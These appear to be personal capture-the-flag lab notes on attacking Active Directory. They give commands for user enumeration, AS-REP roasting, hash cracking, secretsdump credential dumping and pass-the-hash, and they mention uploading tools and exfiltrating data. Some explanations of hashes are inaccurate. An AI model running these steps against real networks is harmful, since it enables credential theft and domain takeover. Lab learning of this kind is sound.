0. enum4linux
... generally reveals shares, etc.

1. to get AD domain name, scan with nmap:

	sudo nmap -sC -sT -sV 10.10.31.222 -oN ldap 

	-sC: standard scripts use ldap to enumerate port 389, which will reveal the full domain name

add the domain name to /etc/hosts 
	
	>> [ip] 	[host name] 	[domain]
	
	where host name looks like "XXX.htb" and domain name often looks like "XXX.local"


2. use the domain name to enumerate users:

	##kerbrute enumusers --dc {domain name} -d {domain name} userlist.txt

	kerbrute enumusers --dc [IP ADDRESS] -d [DOMAIN NAME] userlist.txt

	note that the domain name is usually a url with a TLD like .com, .org, etc. In the case of AD,
	its often configured using a .local TLD as a matter of habit 

3. attempt to ASREPRoast user accounts which are misconfigured with "Does not requre Pre-Authentication"
	using the GetNPUsers.py (NP=no pre-auth) script from Impacket. Specifically
	we're trying to request kerberos tickets with hashes from the kerberos TGS 
	that we can later crack for passwords. Kerberos will sometimes issue tickets
	to accounts that do not require pre-auth.

	python3 /opt/impacket/examples/GetNPUsers.py [DOMAIN NAME]/[USERNAME] -no-pass -usersfile ./npusers

	where DOMAIN NAME would be something like XXX.local and USERNAME is an enumerated user from step 2

	where the ./npusers file is a list of usernames gained from step #2

	this will give you a kerberos hash that you can crack for a password

4. crack the hash(s) that you get back from Kerberos TGS using hashcat, generally kb5 type
	... if you're unsure about the type of hash, check on hashcat.net examples page	
hashcat -a 0 -m 18200 ./svc-admin_hash ./passwordlist.txt --force


5. after cracking the hash, you now have a user password. Attempt to map out  SAMBA shares using these
	credentials
	... NOTE: there may have been no shares when you anonymously list with smbclient
		don't let that discourage you. with credentials, new shares are likely visible
smbclient -L 10.10.64.123 -U svc-admin 

	OR, check for wsman on port 5985 (login with evil-winrm)
	OR, check for rdesktop
	basically just check for anywhere to plug the credentials into
	
	it may be a good idea to do a full port scan, ports 1-65535, to find somewhere to log into

6.a. (IF SMB): then connect to a share using those credentials

smbclient //10.10.64.123/backup -U svc-admin

and steal any info you can

6.b. (IF WINDOWS): Upload a script like PowerUp.ps1 (see Sauna notes for how to setup SimpleHTTPServer and Invoke-WebRequest to get PowerUp on windows box)

	You might get the autologon.exe credentials, which you can use to dump secrets using the command in step #7 (can also pass a one-liner with password)

6.c. (LAST RESORT): As a last resort and/or to pivot throughout AD, you might want to upload a SharpHound.exe and gather some .json files with it, exfiltrate
	back with the evil-winrm download function 

7. when you can find a user account, use Impacket secretsdump.py to dump all password 
	hashes that the user has access to -- the purpose of this is privilege escalation

	python3 /opt/impacket/examples/secretsdump.py -dc-ip 10.10.64.123 backup@spookysec.local

	this yields many hashes

	hashes yielded from DRSUAPI (the NTDS.DIT dump) are NTLM hashes of the form
		[userhash]:[passhash]

	so the part after the colon is the password hash

NOW, to escalate privileges, remember

	Why are we grabbing password HASHES? (see: hashing vs encryption)

	It's because applications only check password hashes. they never know or store
	the cleartext password. So, you can PASS THE HASH -- meaning, you can use
	these account password hashes without every knowing the real password -- and
	the application you're attacking will never know the difference. You can
	authenticate using the hash alone

		... aside: hash collision attacks allow you to authenticate by 
			guessing a password that creates the same hash using a different 
			password, so you can get in without knowing the real password in that
			case as well
		
		... aside: note that passwords are usually encrypted, then encoded in that order 

	Pass the hash with "evil-winrm"

	

